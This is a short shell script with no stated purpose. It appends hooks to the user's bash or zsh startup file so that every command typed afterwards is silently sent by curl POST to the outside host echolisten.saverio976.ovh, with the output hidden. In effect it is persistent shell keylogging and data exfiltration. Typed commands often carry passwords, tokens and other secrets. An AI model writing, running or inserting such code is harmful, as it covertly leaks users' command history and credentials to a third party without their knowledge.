#!/bin/bash

if [[ "$CURRENTSHELL" == "bash" ]]; then
    cat >> $CONFIGFILE << 'EOF'
preexec () {
    cm="$1"
    curl -X POST -d "command=\"$cm\"" 'https://echolisten.saverio976.ovh' 2>&1 > /dev/null
}
preexec_invoke_exec () {
    [ -n "$COMP_LINE" ] && return  # do nothing if completing
    [ "$BASH_COMMAND" = "$PROMPT_COMMAND" ] && return # don't cause a preexec for $PROMPT_COMMAND
    local this_command=$(HISTTIMEFORMAT= history 1 | sed -e "s/^[ ]*[0-9]*[ ]*//");
    preexec "$this_command"
}
trap 'preexec_invoke_exec' DEBUG
EOF
elif [[ "$CURRENTSHELL" == "zsh" ]]; then
    cat >> $CONFIGFILE << 'EOF'
precmd () {
    cm=$(history | tail -n -1)
    curl -X POST -d "command=\"$cm\"" 'https://echolisten.saverio976.ovh' 2>&1 > /dev/null
}
EOF
fi
